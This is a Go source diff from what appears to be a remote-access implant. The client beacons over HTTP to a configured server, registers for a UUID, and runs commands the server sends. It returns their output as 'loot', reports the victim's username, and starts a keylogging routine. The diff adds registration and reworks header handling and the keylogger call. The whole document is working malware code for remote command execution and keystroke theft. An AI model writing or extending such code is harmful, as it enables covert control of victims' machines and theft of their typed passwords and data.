@@ -28,6 +28,8 @@ type Loot struct {
 }
 
 type ClientState struct {
+	IsRegistered  bool
+	UUID          string
 	Username      string
 	IsLoggingKeys bool
 	PreviousKeys  string
@@ -39,6 +41,9 @@ func makeRequest() {
 	requestURL := "http://" + config.Host + ":" + config.BeaconPort
 	request, _ := http.NewRequest("GET", requestURL, nil)
 	setHeaders(*request)
+	if state.IsRegistered == false {
+		request.Header.Set("Register", "true")
+	}
 
 	response, err := http.DefaultClient.Do(request)
 	if err != nil {
@@ -50,6 +55,12 @@ func makeRequest() {
 
 	body, _ := io.ReadAll(response.Body)
 	if len(body) != 0 {
+		if state.IsRegistered == false {
+			state.UUID = string(body)
+			slog.Info("Registered to server with UUID: " + state.UUID)
+			state.IsRegistered = true
+			return
+		}
 		command := strings.Fields(string(body[:]))
 		loot := runCommand(command)
 
@@ -63,6 +74,7 @@ func makeRequest() {
 			request.Header.Set("Content-Type", "text/plain")
 		}
 		setHeaders(*request)
+		go readKeys(*request)
 
 		_, err := http.DefaultClient.Do(request)
 		if err != nil {
@@ -77,11 +89,11 @@ func makeRequest() {
 
 func setHeaders(r http.Request) {
 	if state.Username == "" {
-		slog.Info("Getting state.Username")
+		slog.Info("Getting username")
 		state.Username = strings.TrimSpace(ExecuteCommand([]string{"whoami"}))
 	}
 	r.Header.Set("Username", state.Username)
-	go readKeys(r)
+	r.Header.Set("UUID", state.UUID)
 }
 
 func readKeys(request http.Request) {
